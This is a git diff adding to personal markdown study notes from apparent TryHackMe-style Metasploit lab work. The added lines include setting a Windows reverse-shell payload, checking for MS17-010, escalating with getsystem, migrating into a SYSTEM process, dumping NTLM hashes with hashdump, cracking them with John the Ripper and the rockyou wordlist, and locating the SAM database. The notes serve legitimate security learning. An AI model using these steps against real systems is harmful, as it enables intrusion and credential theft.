@@ -228,6 +228,7 @@ https://doi.org/10.6028/NIST.IR.8105
 * most important use: integrity checking
 * bruteforce, with **John the Ripper**
   * john --format=raw-md5 myHash.txt
+  * --wordlist=/usr/share/wordlists/rockyou.txt
   * john --format=raw-md4 --wordlist=xxx.txt myHash.txt
   * john --format=raw-sha1
   * john --format=gpg
@@ -557,3 +558,58 @@ https://thehackernews.com/2019/10/linux-sudo-run-as-root-flaw.html
   * https://www.vulnhub.com/entry/metasploitable-2,29/
   * File > Tools > Network manager (add)
     * add to each VM instead of Nat in network
+* "Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:" `set payload windows/x64/shell/reverse_tcp`
+* https://help.tryhackme.com/106141-openvpn/606073-openvpn-general-troubleshooting
+* `set LHOST tun0`
+* `auxiliary/scanner/smb/smb_ms17_010` to verify that it is vulnerable
+  * Modules
+    * Encoders
+    * Evasion
+    * Exploits
+    * NOPs
+    * Payloads
+      * single/inline: generic/shell_reverse_tcp
+      * not inline= staged: shell"/"reverse_tcp
+    * Post
+* `show payloads`
+* `set payload 1`
+  * Payloads are the code that will run on the target.
+* `debug`
+* `help set`
+* `history`
+* "the tab key"
+* see required options
+* back...
+* info
+
+![](_images/img.png)
+
+* https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking
+* search type:auxiliary platform:
+* mfs ex> (context prompt)
+* meterpreter> (the Meterpreter prompt)
+* unset all
+* unset xxx
+* setg used in all modules
+* `exploit -z` in the background
+* check: check if exploitable, if supported
+* background/CTRL+Z to background sessions
+  * sessions
+  * sessions -i <id>
+* shell to meterpreter (seems useless in msf6)
+  * `post/multi/manage/shell_to_meterpreter`
+  * session
+  * `shell`
+    * `whoami`
+  * `getsystem`
+  * `sysinfo`
+  * `ps` find NT AUTHORITY\SYSTEM and migrate to it -> `migrate pid`
+  * `hashdump`
+    * username
+    * rid
+    * LM hash
+    * NTML hash - decrypt this (john nt)
+* KeyLocations Windows
+  * Root (cd /)
+  * Documents
+  * Windows/System32/config/ (sam database - where password are stored)
